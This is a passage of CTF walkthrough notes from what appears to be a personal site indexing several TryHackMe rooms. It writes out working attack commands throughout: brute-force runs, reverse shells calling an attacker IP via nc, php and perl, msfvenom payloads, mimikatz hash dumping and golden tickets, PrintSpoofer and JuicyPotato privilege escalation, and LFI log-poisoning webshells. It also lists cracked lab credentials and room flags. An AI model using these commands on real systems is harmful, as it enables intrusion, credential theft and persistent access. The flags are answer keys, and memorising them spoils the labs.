seconds\n</code></pre>"},{"location":"MrRobot/mrrobot/#webpage","title":"webpage","text":"<p>Here the http and https webpage look same</p> <p></p> <p>on brute-forcing there is a directory <code>/0/</code> and ther its says its WordPress site.</p> <p></p> <p>/robots.txt</p> <p><code>User-agent: * fsocity.dic key-1-of-3.txt</code></p> <p></p> <p>Flag 1 <code>073403c8a58a1f80d943455fb30724b9</code> </p>"},{"location":"MrRobot/mrrobot/#wordpress","title":"wordpress","text":"<p>http://10.10.247.140/wp-login</p>"},{"location":"MrRobot/mrrobot/#brute-forcing-the-login-page","title":"brute forcing the login page","text":"<p>I am brute forcing it with the list we got from the robots.txts</p> <pre><code>hydra -L fsocity.dic -p pass 10.10.247.140 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PWD^:Invalid username\"\nHydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-19 14:04:19\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task\n[DATA] attacking http-post-form://10.10.247.140:80/wp-login.php:log=^USER^&amp;pwd=^PWD^:Invalid username\n[80][http-post-form] host: 10.10.247.140   login: Elliot   password: pass\n[STATUS] 634.00 tries/min, 634 tries in 00:01h, 857601 to do in 22:33h, 16 active\n^CThe session file ./hydra.restore was written. Type \"hydra -R\" to resume session.\n</code></pre> <p>sort the list first using  <code>sort fsocity.dic | uniq &gt; fsocity-sorted.txt</code></p> <pre><code> wpscan --url http://10.10.247.140/ -U Elliot -P fsocity-sorted.txt -t 30   \n</code></pre> <p></p>"},{"location":"MrRobot/mrrobot/#creds-ellioter28-0652","title":"Creds  Elliot:ER28-0652","text":""},{"location":"MrRobot/mrrobot/#wp-admin","title":"wp-admin","text":"<p>not navigate to appereance and editor and change the 404 not found code to the php reverse shell code</p> <p>and after chnaging listen on port and navigate to any unkown url</p> <p></p>"},{"location":"MrRobot/mrrobot/#user","title":"user","text":"<p>here we got a md5 hash and have to crack it to get the user robot </p> <p></p> <p><code>robot:c3fcd3d76192e4007dfb496cca67e13b</code></p> <p>using crack station we get the pass</p> <p>robot:abcdefghijklmnopqrstuvwxyz</p> <p></p> <p>and elivating the shell and changing the user, we got the 2nd flag </p> <p><code>822c73956184f694993bede3eb39f959</code></p> <p></p>"},{"location":"MrRobot/mrrobot/#root","title":"root","text":"<p>running <code>find / -perm -u=s -type f 2&gt;/dev/null</code></p> <p></p> <p>there is the  nmap executable </p> <p>and from here we https://gtfobins.github.io/gtfobins/nmap/ we can get shell from nmap </p> <p></p> <p>3rd flag == <code>04787ddef27c3dee1ee161b21670b4e4</code></p>"},{"location":"Overpass%202%20-%20Hacked/00-creds/","title":"00 creds","text":"<pre><code>paradox:secuirty3\nszymex:abcd123\nbee:secret12\nmuirland:1qaz2wsx\njames:november16\n</code></pre>"},{"location":"Overpass%202%20-%20Hacked/01-pcapng%20analysis/","title":"01 pcapng analysis","text":""},{"location":"Overpass%202%20-%20Hacked/01-pcapng%20analysis/#overpass-2-hacked","title":"Overpass 2 - Hacked","text":"<p>import it in wireshark</p> <p></p> <p>Shell uploaded via /development/</p> <p></p> <p>follow the tcp dump </p> <p></p> <p>payload <code>exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f\")</code></p> <p>passwd : whenevernoteartinstant</p> <p></p> <p>backdoor persistence: https://github.com/NinjaJc01/ssh-backdoor</p> <p></p> <p>/etc/shadow </p> <pre><code>james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/\n\nparadox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0\n\nszymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/\n\nbee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0\n\nmuirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.\n</code></pre> <p> </p> <pre><code>paradox:secuirty3\nszymex:abcd123\nbee:secret12\nmuirland:1qaz2wsx\n</code></pre> <p>the hash and salt from https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go</p> <p>the hacker's hash </p> <p><code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></p> <pre><code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05\n</code></pre> <p>cracking the hash (hashcat mode 1710) : november16</p> <p></p>"},{"location":"Overpass%202%20-%20Hacked/02-nmap/","title":"02 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.82.89  \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 01:02 IST\nNmap scan report for 10.10.82.89\nHost is up (0.13s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)\n|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)\n|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: LOL Hacked\n2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)\n| ssh-hostkey: \n|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.28 seconds\n</code></pre>"},{"location":"Overpass%202%20-%20Hacked/03-web/","title":"03 web","text":""},{"location":"Overpass%202%20-%20Hacked/03-web/#port-80","title":"port 80","text":""},{"location":"Overpass%202%20-%20Hacked/04-user/","title":"04 user","text":"<p>using the creds <code>james:november16</code> we got in from port 2222 the one setuped by the hacker</p> <p></p> <p>user === thm{d119b4fa8c497ddb0525f7ad200e6567}</p>"},{"location":"Overpass%202%20-%20Hacked/05-root/","title":"05 root","text":"<p>as we dont have the james passwd nor can run sudo directly </p> <p>but in the directory there is binary .suid_bash</p> <p></p> <p>and simply running it spawns a shell but but a new pipe line (-p flag gives us root)</p> <p></p> <p>root === thm{d53b2684f169360bb9606c333873144d}</p>"},{"location":"Pickle%20Rick/picklerick/","title":"Picklerick","text":""},{"location":"Pickle%20Rick/picklerick/#nmap","title":"nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.48.170\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 12:44 IST\nNmap scan report for 10.10.48.170\nHost is up (0.14s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 69:45:03:22:0f:68:6a:d1:31:23:c2:b6:cf:02:62:5a (RSA)\n|   256 cc:81:8d:8f:7e:7f:8d:b0:f2:c1:53:5e:6a:70:76:0f (ECDSA)\n|_  256 34:da:89:95:ed:0d:b2:dc:1c:16:ce:dd:a8:2a:82:06 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Rick is sup4r cool\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.79 seconds\n</code></pre>"},{"location":"Pickle%20Rick/picklerick/#web","title":"web","text":"<p>page source  </p> <p></p> <p>robots.txt </p> <p>but there is not dir with <code>Wubbalubbadubdub</code></p> <p>/login.php</p> <p></p> <p>login creds: <code>R1ckRul3s:Wubbalubbadubdub</code></p> <p></p>"},{"location":"Pickle%20Rick/picklerick/#1st-ingredient","title":"1st ingredient","text":"<p><code>less Sup3rS3cretPickl3Ingred.txt</code> </p>"},{"location":"Pickle%20Rick/picklerick/#2nd-ingredient","title":"2nd ingredient","text":"<p>lets get a reverse shell</p> <p>this php shell does ping the box but closes itself <code>php -r '$sock=fsockopen(\"10.17.4.208\",9001);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</code></p> <p></p> <p>same for bash  but perl workerd</p> <p><code>perl -e 'use Socket;$i=\"10.17.4.208\";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'</code></p> <p></p> <p>2nd ingredient</p> <p></p> <p>3rd ingredient</p> <p></p>"},{"location":"Post-Exploitation%20Basics/postexploit/","title":"Enumeration","text":""},{"location":"Post-Exploitation%20Basics/postexploit/#powerview","title":"Powerview","text":"<p><code>Invoke-ShareFinder</code></p> <p></p> <p><code>Get-NetComputer -fulldata | select operatingsystem</code></p> <p></p> <p><code>Get-NetUser</code> </p>"},{"location":"Post-Exploitation%20Basics/postexploit/#bloodhound","title":"Bloodhound","text":"<p>transfer file using  <code>sudo impacket-smbserver sp00f . -smb2support -username sp00f -password Passw0rd!</code></p> <p>and now in the windows box we have to authenticate the user for sharing </p> <p><code>net use \\\\10.50.90.103\\sp00f /USER:sp00f Passw0rd!</code></p> <p>and using the command <code>copy * \\\\10.50.90.103\\sp00f</code> we shared all the files</p> <p>and start <code>neo4j console</code> and <code>bloodhound</code></p> <p>and then upload the zip file we got after importing from analysis  see find all domain admins</p> <p></p> <p>users are Kerberoastable</p> <p></p> <p>sqlservice &amp; KRBTGT</p>"},{"location":"Post-Exploitation%20Basics/postexploit/#server-manager","title":"Server Manager","text":"<p>connect via rdp</p> <p></p> <p>Navigate to the tools tab and select the Active Directory Users and Computers</p> <p></p> <p></p>"},{"location":"Post-Exploitation%20Basics/postexploit/#hash-dump","title":"Hash Dump","text":""},{"location":"Post-Exploitation%20Basics/postexploit/#mimikatz","title":"Mimikatz","text":"<pre><code>cd Downloads &amp;&amp; mimikatz.exe\nprivilege::debug\nlsadump::lsa /patch\n</code></pre> <p>machine2 hash: c39f2beb3d2ec06a62cb887fb391dee0</p> <p>maichine1 hash:  64f12cddaa88057e06a81b54e73b949b</p> <p></p>"},{"location":"Post-Exploitation%20Basics/postexploit/#golden-ticket-analysis","title":"Golden Ticket Analysis","text":""},{"location":"Post-Exploitation%20Basics/postexploit/#mimikatz_1","title":"Mimikatz","text":"<p><code>kerberos::golden\u00a0/user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500</code></p> <p></p> <p></p>"},{"location":"Post-Exploitation%20Basics/postexploit/#maintaining-access","title":"Maintaining Access","text":"<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o exploit.exe</code></p> <p>transfer and run and listen</p> <p></p> <p></p> <pre><code>background\nuse exploit/windows/local/persistence\nset session 1\nrun\n</code></pre> <p></p> <p>Resources -</p> <ul> <li>https://blog.harmj0y.net/</li> <li>https://adsecurity.org/?page_id=1821</li> <li>https://metasploit.help.rapid7.com/docs/about-post-exploitation </li> <li>http://www.pentest-standard.org/index.php/Post_Exploitation</li> <li>https://offsec.red/mimikatz-cheat-sheet/</li> <li>https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</li> </ul> <p>Tools/Malware Used -</p> <ul> <li>https://github.com/gentilkiwi/mimikatz</li> <li>https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1</li> <li>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</li> </ul>"},{"location":"Relevant/00-creds/","title":"00 creds","text":"<pre><code>Bob - !P@$$W0rD!123  \nBill - Juw4nnaM4n420696969!$$$\n</code></pre>"},{"location":"Relevant/01-nmap/","title":"01 nmap","text":"<pre><code>\u2500$ nmap -sC -sV -p- -oN nmap 10.10.157.53\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 11:03 IST\nNmap scan report for 10.10.157.53\nHost is up (0.14s latency).\nNot shown: 65527 filtered ports\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: RELEVANT\n|   NetBIOS_Domain_Name: RELEVANT\n|   NetBIOS_Computer_Name: RELEVANT\n|   DNS_Domain_Name: Relevant\n|   DNS_Computer_Name: Relevant\n|   Product_Version: 10.0.14393\n|_  System_Time: 2021-05-29T05:39:16+00:00\n| ssl-cert: Subject: commonName=Relevant\n| Not valid before: 2021-05-28T05:19:29\n|_Not valid after:  2021-11-27T05:19:29\n|_ssl-date: 2021-05-29T05:39:56+00:00; 0s from scanner time.\n49663/tcp open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)\n|   Computer name: Relevant\n|   NetBIOS computer name: RELEVANT\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2021-05-28T22:39:19-07:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-05-29T05:39:16\n|_  start_date: 2021-05-29T05:19:49\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 385.02 seconds\n</code></pre>"},{"location":"Relevant/02-web/","title":"02 web","text":""},{"location":"Relevant/02-web/#port-80","title":"port 80","text":""},{"location":"Relevant/02-web/#fuzzing","title":"fuzzing","text":"<p><code>gobuster dir -u http://10.10.57.119/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster</code></p> <p>and it gives bunch of 400 nothing else </p> <p></p>"},{"location":"Relevant/02-web/#port-49663","title":"port 49663","text":""},{"location":"Relevant/02-web/#fuzzing_1","title":"fuzzing","text":"<p><code>gobuster dir -u http://10.10.57.119:49663/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster</code></p> <p>and we got a hit for /nt4wrksv the same name as of smb folder</p> <p></p> <p>but its empty but /passwords.txt returns the passwords</p> <p></p>"},{"location":"Relevant/03-smb/","title":"03 smb","text":"<p><code>smbclient \"\\\\\\\\10.10.157.53\\\\nt4wrksv\"</code> </p> <p>getting the passwords</p> <p></p> <pre><code>Bob - !P@$$W0rD!123  \nBill - Juw4nnaM4n420696969!$$$\n</code></pre>"},{"location":"Relevant/04-foothold/","title":"04 foothold","text":"<p>so it seems like the smb is used up in the website to serve the files  so put a payload via smb and call from web ..</p>"},{"location":"Relevant/04-foothold/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f aspx -o shell.aspx</code></p> <p></p> <p>upload and call the shell http://10.10.110.2:49663/nt4wrksv/shell.aspx</p> <p></p> <p>got user</p> <p></p> <p>user === THM{fdk4ka34vk346ksxfr21tg789ktf45}</p>"},{"location":"Relevant/05-root/","title":"05 root","text":"<p>running <code>whomai /priv</code></p> <p></p> <p>and we have  a exploitable service</p> <p><code>SeImpersonatePrivilege        Impersonate a client after authentication Enabled</code></p> <p>on looking there a exploit for this (without metasploit )</p> <p>https://github.com/itm4n/PrintSpoofer</p> <p>transfer the binary PrintSpoofer64</p> <p><code>powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/PrintSpoofer64.exe','C:\\Users\\bob\\Desktop\\PrintSpoofer64.exe</code></p> <p>and run <code>PrintSpoofer64.exe -i -c powershell</code>  and we have root</p> <p></p> <p>root == THM{1fk5kf469devly1gl320zafgl345pv}</p>"},{"location":"Retro/00-creds/","title":"00 creds","text":"<pre><code>wade:parzival\n</code></pre>"},{"location":"Retro/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -p- -oN nmap 10.10.23.86\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 17:49 IST\nNmap scan report for 10.10.23.86\nHost is up (0.13s latency).\nNot shown: 65533 filtered ports\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: RETROWEB\n|   NetBIOS_Domain_Name: RETROWEB\n|   NetBIOS_Computer_Name: RETROWEB\n|   DNS_Domain_Name: RetroWeb\n|   DNS_Computer_Name: RetroWeb\n|   Product_Version: 10.0.14393\n|_  System_Time: 2021-05-29T12:58:37+00:00\n| ssl-cert: Subject: commonName=RetroWeb\n| Not valid before: 2021-05-28T12:18:58\n|_Not valid after:  2021-11-27T12:18:58\n|_ssl-date: 2021-05-29T12:58:39+00:00; -1s from scanner time.\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -1s, deviation: 0s, median: -1s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 2359.27 seconds\n</code></pre>"},{"location":"Retro/02-web/","title":"02 web","text":""},{"location":"Retro/02-web/#port-80","title":"port 80","text":""},{"location":"Retro/02-web/#fuzzing","title":"fuzzing","text":"<p>http://10.10.23.86/retro/</p> <p>its a wordpress site</p> <p></p> <p></p> <p></p> <p>running wpscan</p> <p></p> <p>wordpress 5.2.1</p> <p></p> <p>potential comments</p> <p></p> <p><code>wade:parzival</code></p> <p>and we are in</p>"},{"location":"Retro/03-foothold/","title":"03 foothold","text":"<p>change the 404-php file with one which can execute in windows too and  listen and <code>curl http://10.10.23.86/retro/index.php/2019/12/09/tron-arcade-cabine/</code></p> <p>got the shell </p> <p></p> <p>powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/PrintSpoofer64.exe','C:\\windows\\temp\\PrintSpoofer64.exe')</p> <p>this drops a low level shell </p> <p>with the creds we can rdp into the box </p> <p><code>xfreerdp /u:wade /p:parzival /v:10.10.23.86:3389</code></p> <p></p> <p>user == 3b99fbdc6d430bfb51c72c651a261927</p>"},{"location":"Retro/04-root/","title":"04 root","text":"<p>with the low level shell got from wordpress site</p> <p><code>whoami /priv</code></p> <p></p> <p>PrintSpoofer does not work here</p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges</p> <p>https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505</p> <p>here juicy potato might work but not for Windows Server 2019 and Windows 10 1809 +.</p> <p>so checking  </p> <p>and it should work fine </p> <p>get the binary from https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</p> <p>and transfer the netcat (nc.exe) binary too</p> <pre><code>echo C:\\temp\\nc.exe -e cmd.exe 10.17.4.208 9001 &gt; rev.bat\n\nJuicyPotato.exe -p C:\\temp\\rev.bat -l 9001 -t *\n</code></pre> <p></p> <p></p> <p></p> <p></p> <p>root === 7958b569565d7bd88d10c6f22d1c4063</p>"},{"location":"SSRF/SSRF/","title":"SSRF","text":"<p>bypass using <code>2130706433</code> as 127.0.0.1 </p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-a-decimal-ip-location</p> <p>http://2130706433:3306</p> <p></p> <pre><code>#!/bin/python3\n\nimport requests \nimport re\n\ntotal = 0\n\nfor i in range(65535):\n    url = \"http://10.10.13.252:8000/attack?url=http://2130706433:{}\".format(i)\n    res = requests.get(url=url)\n    req = re.findall('Target is not reachable', res.text)\n    if(req == ['Target is not reachable']):\n        pass\n    else:\n        print(\"port {} open\".format(i))\n        total+=1\n\nprint(\"total open ports {}\".format(total))\n</code></pre> <pre><code>#!/bin/bash\n\ntotal=0\n\nfor i in {1..65535}\ndo\n    #echo \"http://10.1.13.252:${i}\"\n    port_open=$(curl http://10.10.13.252:8000/attack?url=http://2130706433:$i)\n    closed='Target is not reachable'\n    if grep -q \"$closed\" &lt;&lt;&lt; \"$port_open\"\n    then\n        :\n    else\n        echo \"port open $i\"\n    fi\ndone\necho $total\n</code></pre> <p>after running we got ports 22, 3306, 5000, 6783 &amp; 8000 open</p> <p></p> <p></p> <p>and total user from <code>file:///etc/passwd</code></p> <p></p>"},{"location":"SafeZone/safezone/","title":"SafeZone","text":""},{"location":"SafeZone/safezone/#nmap","title":"nmap","text":"<pre><code>\u2500$ nmap -sC -sV -oN nmap 10.10.7.104\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 12:20 IST\nNmap scan report for 10.10.7.104\nHost is up (0.14s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 30:6a:cd:1b:0c:69:a1:3b:6c:52:f1:22:93:e0:ad:16 (RSA)\n|   256 84:f4:df:87:3a:ed:f2:d6:3f:50:39:60:13:40:1f:4c (ECDSA)\n|_  256 9c:1e:af:c8:8f:03:4f:8f:40:d5:48:04:6b:43:f5:c4 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Whoami?\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.73 seconds\n</code></pre>"},{"location":"SafeZone/safezone/#web","title":"web","text":"<p>and we have a register page and then login and also a note.txt </p> <p></p> <p>hint for possible lfi</p> <p>after register and login  </p> <p>details source code</p> <p></p> <p>Reading the pass.txt using </p> <p>http://10.10.7.104/~files/pass.txt</p> <p></p> <p>Now the password is admin__admin bruteforcing the missing 2 integers </p> <pre><code>import requests \nimport re\nimport time\nfor i in range(10):\n        for j in range(10):\n                try_pass = \"admin\"+str(i)+str(j)+\"admin\"\n                url = \"http://10.10.129.218/index.php\"\n                data = {\"username\":'Admin', \"password\":try_pass, \"submit\":'submit'} \n                r = requests.post(url = url, data=data)\n                print(\"trying combination = \", try_pass)\n                err = re.findall(\"Please enter valid login details.\", r.text)\n                timeout = re.findall(\"To many failed login attempts.\", r.text)\n                #print(timeout)\n                #print(err)\n                if (err == [] and timeout == []):\n                        print(\"pass is \"+try_pass)\n                        quit()\n                elif(timeout !=[]):\n                        print(\"sleeping for 60 sec\")\n                        time.sleep(60)\n</code></pre> <p>after running we got the pass: <code>admin44admin</code></p> <p>logging in </p> <p>from above there is hint that try to use <code>page</code> param in get</p> <p>and http://10.10.129.218/detail.php?page=/etc/passwd </p> <p>looking in the page source we have confirmed lfi </p> <p></p> <p>LFI to RCE</p> <p>as we can read the access log  view-source:http://10.10.129.218/detail.php?page=/var/log/apache2/access.log</p> <p><code>curl -A '&lt;?php echo exec($_GET[cmd]) ; ?&gt;' http://10.10.129.218/</code></p> <p>RCE confirmed: view-source:http://10.10.129.218/detail.php?page=/var/log/apache2/access.log&amp;cmd=id</p> <p>10.17.4.208 - - [25/May/2021:13:38:37 +0530] \"GET / HTTP/1.1\" 200 755 \"-\" \"uid=33(www-data) gid=33(www-data) groups=33(www-data)\" </p> <p>Now we can uplooad the php rev shell and then call it via the lfi</p> <p>upload the shell view-source:http://10.10.249.31/detail.php?page=/var/log/apache2/access.log&amp;cmd=curl%20http://10.17.4.208/php-reverse-shell.php%20-o%20/tmp/del.php</p> <p>call it http://10.10.249.31/detail.php?page=/tmp/del.php</p> <p>listen on port</p> <p>got shell as www-data </p>"},{"location":"SafeZone/safezone/#user","title":"user","text":"<p>running sudo -l</p> <p></p> <p>from gtfobins <code>find . -exec /bin/sh \\; -quit</code></p> <p>after fuzzing and googling we get user as files</p> <pre><code>sudo -u files find . -exec /bin/sh -p \\; -quit\n</code></pre> <p></p> <p><code>ls -la</code></p> <p></p> <p>hash : <code>$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.</code></p> <p>its a sha512 hash</p> <p>files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.</p> <pre><code>files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.\n</code></pre> <p></p> <p><code>files:magic</code></p> <p>again <code>sudo -l</code></p> <p></p> <p><code>sudo -uyash /usr/bin/id</code></p> <p></p> <p>running <code>netstat -ant</code> </p> <p>forwarding the port 8000 to localhost  <code>ssh -L 8000:127.0.0.1:8000 files@10.10.47.62</code> </p> <p></p> <p>/login.html</p> <p></p> <p>and tryting to login with <code>admin:admin44admin</code> we cant get in. </p> <p>so upon looking the source code  we see the values are hardcoded as <code>user:pass</code></p> <p></p> <p>and randomly trying to get something from the message section, there is a possible rce..</p> <p></p> <p>and also we can ping our box.</p> <p></p> <p></p> <p>tranfer the shell using ssh and make it executable</p> <p></p> <p>and exectue via the web    and we got shell   </p> <p>user flag === THM{c296539f3286a899d8b3f6632fd62274}   </p>"},{"location":"SafeZone/safezone/#root","title":"Root","text":"<p><code>sudo -l</code> </p> <p>on executing it seems like a copying function</p> <p></p> <p>and it is.. </p> <p>now we can read the root flag</p> <p></p> <p>root flag === THM{63a9f0ea7bb98050796b649e85481845}</p>"},{"location":"Skynet/00-creds/","title":"00 creds","text":"<p><code>milesdyson:cyborg007haloterminator</code></p>"},{"location":"Skynet/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.82.251\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 14:51 IST\nNmap scan report for 10.10.82.251\nHost is up (0.13s latency).\nNot shown: 993 closed ports\nPORT     STATE    SERVICE     VERSION\n22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)\n|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)\n|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)\n80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Skynet\n110/tcp  open     pop3        Dovecot pop3d\n|_pop3-capabilities: PIPELINING SASL CAPA TOP RESP-CODES UIDL AUTH-RESP-CODE\n139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n143/tcp  open     imap        Dovecot imapd\n|_imap-capabilities: LITERAL+ more OK ID LOGIN-REFERRALS post-login IMAP4rev1 have listed capabilities LOGINDISABLEDA0001 IDLE Pre-login SASL-IR ENABLE\n445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\n9594/tcp filtered msgsys\nService Info: 